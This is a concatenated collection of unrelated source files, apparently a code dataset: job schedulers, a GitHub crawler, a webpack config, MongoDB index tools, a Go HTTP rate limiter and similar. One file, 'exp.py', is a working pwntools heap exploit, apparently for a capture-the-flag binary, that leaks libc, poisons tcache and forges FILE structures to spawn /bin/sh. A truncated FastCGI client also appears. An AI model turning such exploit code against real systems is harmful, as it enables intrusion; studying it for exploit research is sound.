// THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
// WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
// AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
// INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS
// OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER
// TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF
// THIS SOFTWARE.


using System;
using System.Collections.Generic;
using Hangfire.Client;
using Hangfire.Common;
using Hangfire.States;
using Hangfire.Storage;


namespace ConsoleApp28
{
 public class SkipWhenPreviousJobIsRunningAttribute : JobFilterAttribute, IClientFilter, IApplyStateFilter
 {
 public void OnCreating(CreatingContext context)
 {
 var connection = context.Connection as JobStorageConnection;


 // We can't handle old storages
 if (connection == null) return;


 // We should run this filter only for background jobs based on 
 // recurring ones
 if (!context.Parameters.ContainsKey(""RecurringJobId"")) return;


 var recurringJobId = context.Parameters[""RecurringJobId""] as string;


 // RecurringJobId is malformed. This should not happen, but anyway.
 if (String.IsNullOrWhiteSpace(recurringJobId)) return;


 var running = connection.GetValueFromHash($""recurring-job:{recurringJobId}"", ""Running"");
 if (""yes"".Equals(running, StringComparison.OrdinalIgnoreCase))
 {
                context.Canceled = true;
 }
 }


 public void OnCreated(CreatedContext filterContext)
 {
 }


 public void OnStateApplied(ApplyStateContext context, IWriteOnlyTransaction transaction)
 {
 if (context.NewState is EnqueuedState)
 {
 var recurringJobId = JobHelper.FromJson<string>(context.Connection.GetJobParameter(context.BackgroundJob.Id, ""RecurringJobId""));
 if (String.IsNullOrWhiteSpace(recurringJobId)) return;


                transaction.SetRangeInHash(
 $""recurring-job:{recurringJobId}"",
 new[] { new KeyValuePair<string, string>(""Running"", ""yes"") });
 }
 else if ((context.NewState.IsFinal && !FailedState.StateName.Equals(context.OldStateName, StringComparison.OrdinalIgnoreCase)) || 
 (context.NewState is FailedState))
 {
 var recurringJobId = JobHelper.FromJson<string>(context.Connection.GetJobParameter(context.BackgroundJob.Id, ""RecurringJobId""));
 if (String.IsNullOrWhiteSpace(recurringJobId)) return;


                transaction.SetRangeInHash(
 $""recurring-job:{recurringJobId}"",
 new []{ new KeyValuePair<string, string>(""Running"", ""no"") });
 }
 }


 public void OnStateUnapplied(ApplyStateContext context, IWriteOnlyTransaction transaction)
 {
 }
 }
}
==<SEPERATOR>==
gptshunter-crawler.py
import requests
import time
import json


# Function to fetch comments
def get_comments(cursor=None):
 query = """"""
    query GetComments($owner: String!, $repo: String!, $number: Int!, $cursor: String) {
      repository(owner: $owner, name: $repo) {
        issue(number: $number) {
          comments(first: 100, after: $cursor) {
            nodes {
              author {
                login
              }
              bodyText
            }
            pageInfo {
              endCursor
              hasNextPage
            }
          }
        }
      }
    }
    """"""
 variables = {
 ""owner"": ""airyland"",
 ""repo"": ""gptshunter.com"",
 ""number"": 1,
 ""cursor"": cursor
    }
 response = requests.post(url, json={'query': query, 'variables': variables}, headers=headers)
 return response.json()


# Initialization
url = ""https://api.github.com/graphql""
token = """" # Replace with your GitHub token
headers = {""Authorization"": f""Bearer {token}""}


while True:  # Create an infinite loop
 # Get all comments
 all_comments = []
 has_next_page = True
 cursor = None


 page = 0
 while has_next_page:
 page = page + 1
 print(page)
 data = get_comments(cursor)
 comments = data['data']['repository']['issue']['comments']['nodes']
 all_comments.extend(comments)
 cursor = data['data']['repository']['issue']['comments']['pageInfo']['endCursor']
 has_next_page = data['data']['repository']['issue']['comments']['pageInfo']['hasNextPage']


 # Initialize a comments dictionary
 comments_dict = {}


 # Store all comments
 for comment in all_comments:
 author = comment['author']['login']
 body_text = comment['bodyText']


 if author in comments_dict:
 comments_dict[author].append(body_text)
 else:
 comments_dict[author] = [body_text]


 # Convert the dictionary to a JSON string
 comments_json = json.dumps(comments_dict, ensure_ascii=False, indent=4)


 # Write JSON data to a file
 with open('comments.json', 'w', encoding='utf-8') as file:
 file.write(comments_json)


 print(""Sleeping for 30 minutes..."")
 time.sleep(1800)  # Pause for 30 minutes
==<SEPERATOR>==
exp.py
from pwn import *


context.update(os='linux', arch='amd64')


r = process('./minho')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def new(size, data, abuse_scanf=0):
 r.sendlineafter(b'> ', b'1')
 r.sendlineafter(b': ', b'0' * abuse_scanf + str(size).encode())
 r.sendafter(b': ', data)


def show():
 r.sendlineafter(b'> ', b'2')


def delete(abuse_scanf=0):
 r.sendlineafter(b'> ', b'0' * abuse_scanf + b'3')


def tcache(target, chunk):
 return p64(target ^ chunk >> 12)


new(1, b'A')
delete()
new(2, b'A')
delete()


new(1, b'A', 0x558)
delete()


for i in range(0x52e, 0x527, -1):
 new(1, b'A', i)
 delete()


for i in range(0x4fe, 0x4f7, -1):
 new(1, b'A', i)
 delete()


new(1, b'A' * 0x50)
show()
r.recvuntil(b': ')
r.recvn(0x50)
heap = (u64(r.recvn(5) + b'\x00\x00\x00') << 12) - 0x1000
log.info('heap = 0x%x', heap)
delete()


new(1, p64(0x0) * 3 + p64(0x31) + p64(heap + 0x12c0) * 2 + b'A' * 0x10 + p64(0x30) + p64(0x590))
delete()
new(2, b'A' * 0x50 + p64(0x90) + p64(0x30))
delete()
new(1, b'A' * 0x20)
show()
r.recvuntil(b': ')
r.recvn(0x20)
l.address = u64(r.recvn(6) + b'\x00\x00') - 0x219ce0
log.info('libc = 0x%x', l.address)
delete()
new(1, b'A' * 0x18 + p64(0x91))
delete()


delete(0x400)


new(1, b'\x00' * 0x18 + p64(0x91) + p64(l.address + 0x219d60) + p64(heap + 0x12d0) + p64(heap + 0x12c0) + p64(l.address + 0x219d60))
delete()
new(2, b'A')
delete()


new(1, b'\x00' * 0x18 + p64(0x81) + tcache(l.symbols['_IO_2_1_stdin_'], heap + 0x12c0))
delete()
new(2, b'\x00')
delete()


f = FileStructure()
new(2, f.read(l.symbols['_IO_2_1_stdout_'], 0x1000))


f = FileStructure()
f._IO_write_ptr = 0x1
f._lock = l.address + 0x21ba70
f._wide_data = l.symbols['_IO_2_1_stdout_'] + len(f)
f.vtable = l.symbols['_IO_wfile_jumps']


s = SigreturnFrame()
s['rip'] = l.symbols['system']
s['rdi'] = l.address + 0x1d8698 # /bin/sh
s['rbp'] = l.symbols['setcontext'] + 294
s['&fpstate'] = l.symbols['_IO_2_1_stdout_'] + len(f) + 0x10


r.sendafter(b'> ', bytes(f) + bytes(s))


r.interactive()
==<SEPERATOR>==
main.js
if (BX.PULL !== undefined) {
 BX.PULL.subscribe({
 type: BX.PullClient.SubscriptionType.Server,
 moduleId: 'self',
 callback:
 function (data) {
 
 if (data.command == 'question') {
 const currentUrl = window.location.href;


 if (currentUrl.includes('/crm/deal/details/' + data.params.deal_id + '/?IFRAME=Y')) {
 BX.UI.Dialogs.MessageBox.show(
 {
 message: data.params.message,
 modal: true,
 buttons: BX.UI.Dialogs.MessageBoxButtons.YES_NO,
 onYes: function (messageBox) {
 window.location.href = '/crm/company/details/' + data.params.company + '/';
 },
 onNo: function (messageBox) {
 messageBox.close();
 },
 }
 );
 }
 }


 }
 });
}
==<SEPERATOR>==
A.py
def A(n,i):
 # calculate using a simulation approach.
 i = i-1 # convert to 0-based index.
 urinals = np.zeros(n)
 urinals[i] = 1 # the ith is occupied.
 while True:
 # find the furtherest urinal that is away from any occupied urinal.
 candidates = {} # key: the index of the urinal, value: the distance to the nearest occupied urinal.
 for j in range(n):
 if urinals[j] == 1:
 continue
 else:
 left_distance = 0 if j != 0 else np.inf
 right_distance = 0 if j != n-1 else np.inf
 for k in range(j-1,-1,-1):
 if urinals[k] == 1:
 break
 elif k == 0:
 left_distance = np.inf
 else:
 left_distance += 1
 for k in range(j+1,n):
 if urinals[k] == 1:
 break
 elif k == n-1:
 right_distance = np.inf
 else:
 right_distance += 1
 candidates[j] = min(left_distance,right_distance) 
 # keep only non-zero distance urinals
 candidates = {key:value for key,value in candidates.items() if value != 0}
 if len(candidates) == 0:
 break
 else:
 max_distance = max(candidates.values())
 # randomize the choice if there are multiple urinals with the same distance.
 max_keys = [key for key,value in candidates.items() if value == max_distance]
 # print(max_keys)
 idx = np.random.choice(max_keys)
 urinals[idx] = 1
 return urinals.sum()
"
"bc-webpack-config.js
","const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin,
 CleanPlugin = require('clean-webpack-plugin'),
 LodashPlugin = require('lodash-webpack-plugin'),
 path = require('path'),
 webpack = require('webpack');


// Common configuration, with extensions in webpack.dev.js and webpack.prod.js.
module.exports = {
 bail: true,
 context: __dirname,
 entry: {
 main: './assets/js/app.js',
 head_async: ['lazysizes'],
 polyfills: './assets/js/polyfills.js',
 },
 module: {
 rules: [
 {
 test: /\.jsx$/,
 exclude: /node_modules/,
 use: {
 loader: ""babel-loader"",
 options: {
 presets: ['@babel/preset-react'],
 plugins: ['@babel/plugin-proposal-class-properties']
 },
 }
 },
 {
 test: /\.scss$/,
 use:  [
 'style-loader',
 {
 loader: 'css-loader',
 options: {
 modules: true
 }
 },
 'sass-loader'
 ],
 },
 {
 test: /\.css$/,
 include: /node_modules/,
 use: [
 ""style-loader"",
 {
 loader: ""css-loader"",
 options: {
 modules: false
 }
 }
 ]
 },
 {
 test: /\.(png|svg|jpe?g|gif)$/,
 include: /node_modules/,
 use: [
 {
 loader: 'file-loader',
 options: {
 name: '[name].[ext]',
 }
 }
 ]
 },
 {
 test: /\.(png|woff|woff2|eot|ttf|svg)$/,
 loader: 'url-loader?limit=100000'
 },
 {
 test: /\.js$/,
 include: /(assets\/js|assets\\js|stencil-utils)/,
 use: {
 loader: 'babel-loader',
 options: {
 plugins: [
 '@babel/plugin-syntax-dynamic-import', // add support for dynamic imports (used in app.js)
 'lodash', // Tree-shake lodash
 ],
 presets: [
 ['@babel/preset-env', {
 loose: true, // Enable ""loose"" transformations for any plugins in this preset that allow them
 modules: false, // Don't transform modules; needed for tree-shaking
 useBuiltIns: 'entry',
 targets: '> 1%, last 2 versions, Firefox ESR',
 corejs: '^3.6.5',
 }],
 ],
 },
 },
 },
 {
 test: require.resolve('jquery'),
 use: [{
 loader: 'expose-loader',
 options: '$',
 }],
 },
 ],
 },
 output: {
 chunkFilename: 'theme-bundle.chunk.[name].js',
 filename: 'theme-bundle.[name].js',
 path: path.resolve(__dirname, 'assets/dist'),
 },
 performance: {
 hints: 'warning',
 maxAssetSize: 1024 * 300,
 maxEntrypointSize: 1024 * 300,
 },
 plugins: [
 new CleanPlugin(['assets/dist'], {
 verbose: false,
 watch: false,
 }),
 new LodashPlugin(), // Complements babel-plugin-lodash by shrinking its cherry-picked builds further.
 new webpack.ProvidePlugin({ // Provide jquery automatically without explicit import
 $: 'jquery',
 jQuery: 'jquery',
 'window.jQuery': 'jquery',
 }),
 new BundleAnalyzerPlugin({
 analyzerMode: 'static',
 openAnalyzer: false,
 }),
 ],
 resolve: {
 alias: {
 jquery: path.resolve(__dirname, 'node_modules/jquery/dist/jquery.min.js'),
 jstree: path.resolve(__dirname, 'node_modules/jstree/dist/jstree.min.js'),
 lazysizes: path.resolve(__dirname, 'node_modules/lazysizes/lazysizes.min.js'),
 nanobar: path.resolve(__dirname, 'node_modules/nanobar/nanobar.min.js'),
 'slick-carousel': path.resolve(__dirname, 'node_modules/slick-carousel/slick/slick.min.js'),
 'svg-injector': path.resolve(__dirname, 'node_modules/svg-injector/dist/svg-injector.min.js'),
 sweetalert2: path.resolve(__dirname, 'node_modules/sweetalert2/dist/sweetalert2.min.js'),
 },
 extensions: ['.js', '.jsx'],
 },
};
==<SEPERATOR>==
EnumDictionary.cs
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;


namespace ZLogger.Internal;


internal sealed class EnumDictionary
{
 readonly Entry[][] buckets; // immutable array.
 readonly int indexFor;
 const float LoadFactor = 0.75f;


 EnumDictionary(Entry[][] buckets)
 {
 this.buckets = buckets;
 this.indexFor = buckets.Length - 1;
 }


 public static EnumDictionary Create<T>()
 {
 var type = typeof(T);


 if (!type.IsEnum) throw new ArgumentException();


 // load Enum value and name pair
 var values = new List<(string, object)>();
 foreach (var value in Enum.GetValues(type))
 {
 var name = Enum.GetName(type, value);
            values.Add((name!, value));
 }


 // create dictionary
 var tableSize = CalculateCapacity(values.Count, LoadFactor);
 var buckets = new Entry[tableSize][];
 var dict = new EnumDictionary(buckets);


 foreach (var (name, enumValue) in values)
 {
 // dictionary key is enumValue, value is name.
 var unboxedEnumValue = (T)enumValue;
 var key = MemoryMarshal.CreateReadOnlySpan(ref Unsafe.As<T, byte>(ref unboxedEnumValue), Unsafe.SizeOf<T>()).ToArray();


 var value1 = Encoding.UTF8.GetBytes(name);
 var value2 = JsonEncodedText.Encode(value1);


 var entry = new Entry(key, name, value1, value2);
            dict.TryAddInternal(entry);
 }


 return dict;
 }


 ref Entry GetValueRefOrNullRef(ReadOnlySpan<byte> key)
 {
 var table = buckets;
 var hash = GetBytesHashCode(key);
 var entry = table[hash & indexFor];


 if (entry == null) goto NOT_FOUND;


 for (int i = 0; i < entry.Length; i++)
 {
 ref var v = ref entry[i];


 if (v.Key.AsSpan().SequenceEqual(key))
 {
 return ref v;
 }
 }


    NOT_FOUND:
 return ref Unsafe.NullRef<Entry>();
 }


 public string? GetStringName(ReadOnlySpan<byte> value)
 {
 ref var entry = ref GetValueRefOrNullRef(value);
 if (Unsafe.IsNullRef(ref entry)) return null;
 return entry.Name;
 }


 public ReadOnlySpan<byte> GetUtf8Name(ReadOnlySpan<byte> value)
 {
 ref var entry = ref GetValueRefOrNullRef(value);
 if (Unsafe.IsNullRef(ref entry)) return Array.Empty<byte>();
 return entry.Utf8Name;
 }


 public JsonEncodedText? GetJsonEncodedName(ReadOnlySpan<byte> value)
 {
 ref var entry = ref GetValueRefOrNullRef(value);
 if (Unsafe.IsNullRef(ref entry)) return default;
 return entry.JsonEncoded;
 }


 bool TryAddInternal(Entry entry)
 {
 var h = GetBytesHashCode(entry.Key);


 var array = buckets[h & (indexFor)];
 if (array == null)
 {
            buckets[h & (indexFor)] = new[] { entry };
 }
 else
 {
 // check duplicate
 for (int i = 0; i < array.Length; i++)
 {
 var e = array[i].Key;
 if (entry.Key.AsSpan().SequenceEqual(e))
 {
 return false;
 }
 }


 var newArray = new Entry[array.Length + 1];
            Array.Copy(array, newArray, array.Length);
 array = newArray;
            array[array.Length - 1] = entry;
            buckets[h & (indexFor)] = array;
 }


 return true;
 }


 static int CalculateCapacity(int collectionSize, float loadFactor)
 {
 var size = (int)(((float)collectionSize) / loadFactor);


 size--;
 size |= size >> 1;
 size |= size >> 2;
 size |= size >> 4;
 size |= size >> 8;
 size |= size >> 16;
 size += 1;


 if (size < 8)
 {
 size = 8;
 }
 return size;
 }


 static int GetBytesHashCode(ReadOnlySpan<byte> bytes)
 {
 var hash = new HashCode();
        hash.AddBytes(bytes);
 return hash.ToHashCode();
 }


 readonly struct Entry
 {
 public readonly byte[] Key;
 public readonly string Name;
 public readonly byte[] Utf8Name;
 public readonly JsonEncodedText JsonEncoded;


 public Entry(byte[] key, string name, byte[] utf8Name, JsonEncodedText jsonEncoded)
 {
 Key = key;
 Name = name;
 Utf8Name = utf8Name;
 JsonEncoded = jsonEncoded;
 }


 // for debugging
 public override string ToString()
 {
 return Name;
 }
 }
}
"
"mongodbIndexExporter.js
","/*
How to export
* mongo is mongoshell command

mongo dbname --quiet mongodbIndexExporter.js > index.js
*/
let collectionNames = db.getCollectionNames();
let index_data = {'collections': []};


for (let i in collectionNames) {
 let collection = collectionNames[i];
 let indexes;
 try {
 indexes = db[collection].getIndexes();
 } catch (err) { continue; }
 
 let json = { 'name': collection, 'indexes': [] };


 for (let j in indexes) {
 let idx = indexes[j];
 let doc = { 'name': idx['name'], 'key': idx['key'] };
 if ('expireAfterSeconds' in idx) {
 doc['expireAfterSeconds'] = idx['expireAfterSeconds'];
 }


 if ('background' in idx) {
 doc['background'] = idx['background'];
 }


 if ('unique' in idx) {
 doc['unique'] = idx['unique'];
 }


 if('collation' in idx) {
 doc['collation'] = {
 'locale': idx['collation']['locale'],
 'strength': idx['collation']['strength'],
 };
 }


 json['indexes'].push(doc)
 }
 index_data['collections'].push(json);
};
print('let indexes = ');
printjson(index_data);
print(';');
/*
How to (required index.js exported from exporter.js)
* mongo is mongoshell command

mongo dbname --quiet --eval ""let mode='DRYRUN';"" mongodbIndexImporter.js

 */


// available modes
let LIVE = 'LIVE';
let DRYRUN = 'DRYRUN'; // actually all other words except 'LIVE' are DRYRUN mode.


load('index.js');
if(typeof mode == 'undefined') {
 print(red('mode variable required!')+' '+cyan('--eval ""let mode=\'DRYRUN\';"" or ""let mode=\'LIVE\';'));
}
else {
 print('*** Index importer: started with ' + yellow(mode) + ' mode ***');


 let collections = indexes['collections'];
 let collectionNames = db.getCollectionNames();


 for (let i in collections) {
 let collection = collections[i];
 let indexItems = collection[""indexes""];
 let collectionName = collection['name'];
 print('='.repeat(55));
 if (collectionNames.indexOf(collectionName) >=0) {
 print('collection '+ green(collectionName) + ' already '+green('exists'));
 } else {
 print('will '+yellow('create')+' collection '+ green(collectionName));
 if (mode == LIVE) {
 // do create collection
 db.createCollection(collectionName)
 }
 }


 let dbCollection = db.getCollection(collectionName);
 let existingIndexes = dbCollection.getIndexes();


 for(let itemIdx in indexItems) {
 let indexItem = indexItems[itemIdx];
 let indexName = indexItem['name'];
 let indexKey = indexItem['key'];
 let checked = false;
 for(let eIdx in existingIndexes) {
 let existingIndex = existingIndexes[eIdx];
 if (existingIndex['name'] == indexName) {
 if(!isSameKey(existingIndex, indexItem)) {
 print('collection '+green(collectionName)+' index '+green(indexName)+' will be '+red('dropped'));
 print('collection '+green(collectionName)+' index '+green(indexName)+' will be '+yellow('re-created'));
 if(mode == LIVE) {
 dbCollection.dropIndex(indexName);
 createIndex(dbCollection, indexName, indexItem);
 }
 }
 else {
 print('collection '+green(collectionName)+' index '+green(indexName)+' is same, skip.');
 }
 checked = true;
 break
 }
 }


 if (!checked) {
 print('collection '+green(collectionName)+' index '+green(indexName)+' will be '+yellow('created'));
 if(mode == LIVE) {
 createIndex(dbCollection, indexName, indexItem);
 }
 }
 }
 
 for(let eIdx in existingIndexes) {
 let checked = false;
 let existingIndex = existingIndexes[eIdx];
 for(let itemIdx in indexItems) {
 let indexItem = indexItems[itemIdx];
 let indexName = indexItem['name'];
 if (existingIndex['name'] == indexName) {
 checked = true
 break
 }
 }


 if (!checked) {
 print('collection '+green(collectionName)+' index '+green(existingIndex[""name""])+' will be '+red('dropped'));
 if (mode == LIVE) {
 dbCollection.dropIndex(existingIndex[""name""]);
 }
 }
 }
 }


 if (mode == LIVE) {
 print('Completed! '+magenta('LIVE MODE. All Operatoins are applied on database!'));
 }
 else {
 print('Completed! '+cyan('TEST MODE. Nothing is applied.'));
 }
}


function createIndex(db, name, indexItem) {
 let options = {'name': name};
 let key = indexItem['key'];
 if('expireAfterSeconds' in indexItem) {
 options['expireAfterSeconds'] = indexItem['expireAfterSeconds'];
 }


 if('background' in indexItem) {
 options['background'] = indexItem['background'];
 }


 if('unique' in indexItem) {
 options['unique'] = indexItem['unique'];
 }
 
 if('collation' in indexItem) {
 options['collation'] = indexItem['collation'];
 }
 
 db.createIndex(key, options);
}


function isSameKey(existingIndex, newIndex) {
 let key = existingIndex['key'];
 let newKey = newIndex['key'];


 // -2: v, ns
 let excepted = 0;
 for (let keyName in existingIndex) {
 if (keyName === ""v"") {
 excepted++
 continue
 }


 if (keyName === ""ns"") {
 excepted++
 }
 }
 
 if (Object.keys(existingIndex).length -excepted != Object.keys(newIndex).length) {
 return false;
 }


 if (Object.keys(key).length != Object.keys(newKey).length) {
 return false;
 }


 for(let i in key) {
 let val = key[i];
 if(i in newKey) {
 if(newKey[i] != val) {
 return false;
 }
 }
 else {
 return false;
 }
 }
 let except = ['v', 'ns', 'key'];
 for (let element in existingIndex) {
 if (except.indexOf(element) >= 0) {
 continue;
 }


 if (existingIndex[element] != newIndex[element]) {
 let a = existingIndex[element];
 let b = newIndex[element];
 if (isObject(a) && isObject(b)) {
 print(element)
 for (let el in b) {
 if (a[el] != b[el]) {
 return false;
 }
 }
 return true;


 }
 return false;
 }
 }
 return true;
}


function isObject(val) {
 if (val === null) { return false;}
 return ( (typeof val === 'function') || (typeof val === 'object') );
}


// colors
function red (text) { return colorize(text, 'red') }
function green (text) { return colorize(text, 'green') }
function yellow (text) { return colorize(text, 'yellow') }
function blue (text) { return colorize(text, 'blue') }
function magenta (text) { return colorize(text, 'magenta') }
function cyan (text) { return colorize(text, 'cyan') }
function gray (text) { return colorize(text, 'gray') }


function colorize(text, color, style) {
 // color: 'red', 'green', 'blue'... (see below)
 // styles: 'normal' or undefined, 'bright', 'highlight'


 if (!style) {
 style = 'normal';
 }


 let _ansi = {
 csi: String.fromCharCode(0x1B) + '[',
 reset:      '0',
 text_prop:  'm',


 styles: {
 normal: '3',
 bright:     '9',
 highlight:  '4'
 },


 colors: {
 black:   '0',
 red:     '1',
 green:   '2',
 yellow:  '3',
 blue:    '4',
 magenta: '5',
 cyan:    '6',
 gray:    '7'
 }
 };


 let beginColor = _ansi.csi + _ansi.styles[style] + _ansi.colors[color] + _ansi.text_prop;
 let endColor = _ansi.csi + _ansi.reset + _ansi.text_prop;


 return beginColor + text + endColor;
}
==<SEPERATOR>==
throttled_transport.go
package main


import (
 ""net/http""
 ""time""


 ""golang.org/x/time/rate""
)


// ThrottledTransport Rate Limited HTTP Client
type ThrottledTransport struct {
 roundTripperWrap http.RoundTripper
 ratelimiter *rate.Limiter
}


func (c *ThrottledTransport) RoundTrip(r *http.Request) (*http.Response, error) {
 err := c.ratelimiter.Wait(r.Context()) // This is a blocking call. Honors the rate limit
 if err != nil {
 return nil, err
	}
 return c.roundTripperWrap.RoundTrip(r)
}


// NewThrottledTransport wraps transportWrap with a rate limitter
// examle usage:
// client := http.DefaultClient
// client.Transport = NewThrottledTransport(10*time.Seconds, 60, http.DefaultTransport) allows 60 requests every 10 seconds
func NewThrottledTransport(limitPeriod time.Duration, requestCount int, transportWrap http.RoundTripper) http.RoundTripper {
 return &ThrottledTransport{
 roundTripperWrap: transportWrap,
 ratelimiter:      rate.NewLimiter(rate.Every(limitPeriod), requestCount),
	}
}
==<SEPERATOR>==
gen_chat_html.py
import json
import argparse
import html
import os
from datetime import datetime


def generate_html(json_file, html_file=""chat.html"", metadata=None, date=None):
 with open(json_file, 'r') as file:
 data = json.load(file)


 html_content = """"
 html_content += '<!DOCTYPE html>'
 html_content += '<html><head><link rel=""stylesheet"" href=""style.css"">'
 html_content += f'<title>LM-Studio Chat with {metadata[""lastUsedModel""][""title""]}</title>'
 html_content += '<script src=""https://cdnjs.cloudflare.com/ajax/libs/markdown-it/13.0.2/markdown-it.min.js"" integrity=""sha512-ohlWmsCxOu0bph1om5eDL0jm/83eH09fvqLDhiEdiqfDeJbEvz4FSbeY0gLJSVJwQAp0laRhTXbUQG+ZUuifUQ=="" crossorigin=""anonymous"" referrerpolicy=""no-referrer""></script>'
 html_content += '<link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css"">'
 html_content += '<script src=""https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js""></script>'
 html_content += '</head><body>'
 # Header with the model name and date
 html_content += '<div class=""header"">'
 html_content += '<h1>LM-Studio Chat</h1>'
 html_content += f'<p><strong>Model</strong>: {metadata[""lastUsedModel""][""title""]}</p>'
 html_content += f'<p><strong>Date</strong>: {date.strftime(""%B %d, %Y %H:%M:%S %p"")}</p>'
 html_content += '</div>'
 # Chat messages
 html_content += '<div class=""chat"">'
 for message in data['messages']:
 role_class = ""user"" if message['role'] == ""user"" else ""assistant""
 html_content += f'<h3 class=""{role_class}"">{message[""role""].title()}</h3>'
 html_content += f'<div class=""{role_class}""><div class=""content"">{html.escape(message[""content""])}</div></div>'
 html_content += '</div>'
 html_content += """"""
<script>
document.addEventListener('DOMContentLoaded', (event) => {
    const md = new markdownit();
    document.querySelectorAll("".content"").forEach(block => {
        block.innerHTML = md.render(block.textContent);
    });

    document.querySelectorAll(""pre code"").forEach(block => {
        hljs.highlightElement(block);
    });
});
</script>
""""""
 html_content += '</body></html>'


 with open(html_file, ""w"") as output_file:
 output_file.write(html_content)


def main():
 parser = argparse.ArgumentParser(description='Generate HTML file from JSON file')
 parser.add_argument('json_file', metavar='json_file', type=str, help='JSON file')
 parser.add_argument('-O', '--output', metavar='output_file', type=str, help='output HTML file', default=""chat.html"")
 args = parser.parse_args()


 # Load the metadata file given the chat file
 # If args.file is '/Users/moyix/.cache/lm-studio/chats/1700066024624.chat.json'
 # metadata will be in '/Users/moyix/.cache/lm-studio/chats/1700066024624.metadata.chat.json'
 metadata_file = args.json_file.replace("".chat.json"", "".metadata.chat.json"")
 metadata = json.load(open(metadata_file, 'r'))


 # Get the timestamp from the filename; it's in milliseconds since epoch
 timestamp = int(os.path.basename(args.json_file).split(""."")[0])
 date = datetime.fromtimestamp(timestamp / 1000.0)


 generate_html(args.json_file, args.output, metadata, date)


if __name__ == ""__main__"":
 main()
body {
 font-family: Arial, sans-serif;
 background-color: #f4f4f4;
}


.chat, .header {
 max-width: 600px;
 margin: 20px auto;
 border: 1px solid #ddd;
 padding: 10px;
 background: white;
}


.user, .assistant {
 margin-bottom: 10px;
}


.user {
 text-align: left;
}


.assistant {
 text-align: left;
}


.content {
 padding: 5px 10px;
 border-radius: 5px;
 background: #eee;
}


pre code {
 background-color: #f4f4f4;
 border: 1px solid #ccc;
 display: block;
 padding: 10px;
 overflow-x: auto;
}
"
"fpm.py
","import socket
import random
import argparse
import sys
from io import BytesIO


# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client


PY2 = True if sys.version_info.major == 2 else False




def bchr(i):
 if PY2:
 return force_bytes(chr(i))
 else:
 return bytes([i])


def bord(c):
 if isinstance(c, int):
 return c
 else:
 return ord(c)


def force_bytes(s):
 if isinstance(s, bytes):
 return s
 else:
 return s.encode('utf-8', 'strict')


def force_text(s):
 if issubclass(type(s), str):
 return s
 if isinstance(s, bytes):
 s = str(s, 'utf-8', 'strict')
 else:
 s = str(s)
 return s




class FastCGIClient:
 """"""A Fast-CGI Client for Python""""""


 # private
 __FCGI_VERSION = 1


 __FCGI_ROLE_RESPONDER = 1
 __FCGI_ROLE_AUTHORIZER = 2
 __FCGI_ROLE_FILTER = 3


 __FCGI_TYPE_BEGIN = 1
 __FCGI_TYPE_ABORT = 2
 __FCGI_TYPE_END = 3
 __FCGI_TYPE_PARAMS = 4
 __FCGI_TYPE_STDIN = 5
 __FCGI_TYPE_STDOUT = 6
 __FCGI_TYPE_STDERR = 7
 __FCGI_TYPE_DATA = 8
 __FCGI_TYPE_GETVALUES = 9
 __FCGI_TYPE_GETVALUES_RESULT = 10
 __FCGI_TYPE_UNKOWNTYPE = 11


 __FCGI_HEADER_SIZE = 8


 # request state
 FCGI_STATE_SEND = 1
 FCGI_STATE_ERROR = 2
 FCGI_STATE_SUCCESS = 3


 def __init__(self, host, port, timeout, keepalive):
 self.host = host
 self.port = port
 self.timeout = timeout
 if keepalive:
 self.keepalive = 1
 else:
 self.keepalive = 0
 self.sock = None
 self.requests = dict()


 def __connect(self):
 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 self.sock.settimeout(self.timeout)
 self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 # if self.keepalive:
 #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
 # else:
 #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
 try:
 self.sock.connect((self.host, int(self.port)))
 except socket.error as msg:
 self.sock.close()
 self.sock = None
 print(repr(msg))
 return False
 return True


 def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
 length = len(content)
 buf = bchr(FastCGIClient.__FCGI_VERSION) \
 + bchr(fcgi_type) \
 + bchr((requestid >> 8) & 0xFF) \
 + bchr(requestid & 0xFF) \
 + bchr((length >> 8) & 0xFF) \
 + bchr(length & 0xFF) \
 + bchr(0) \
 + bchr(0) \
 + content
 return buf


 def __encodeNameValueParams(self, name, value):
 nLen = len(name)
 vLen = len(value)
 record = b''
 if nLen < 128:
 record += bchr(nLen)
 else:
 record += bchr((nLen >> 24) | 0x80) \
 + bchr((nLen >> 16) & 0xFF) \
 + bchr((nLen >> 8) & 0xFF) \
 + bchr(nLen & 0xFF)
 if vLen < 128:
 record += bchr(vLen)
 else:
 record += bchr((vLen >> 24) | 0x80) \
 + bchr((vLen >> 16) & 0xFF) \
 + bchr((vLen >> 8) & 0xFF) \
 + bchr(vLen & 0xFF)
 return record + name + value


 def __decodeFastCGIHeader(self, stream):
 header = dict()
 header['version'] = bord(stream[0])
 header['type'] = bord(stream[1])
 header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
 header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
 header['paddingLength'] = bord(stream[6])
 header['reserved'] = bord(stream[7])
 return header


 def __decodeFastCGIRecord(self, buffer):
 header = buffer.read(int(self.__FCGI_HEADER_SIZE))


 if not header:
 return False
 else:
 record = self.__decodeFastCGIHeader(header)
 record['content'] = b''
 
 if 'contentLength' in record.keys():
 contentLength = int(record['contentLength'])
 record['content'] += buffer.read(contentLength)
 if 'paddingLength' in record.keys():
 skiped = buffer.read(int(record['paddingLength']))
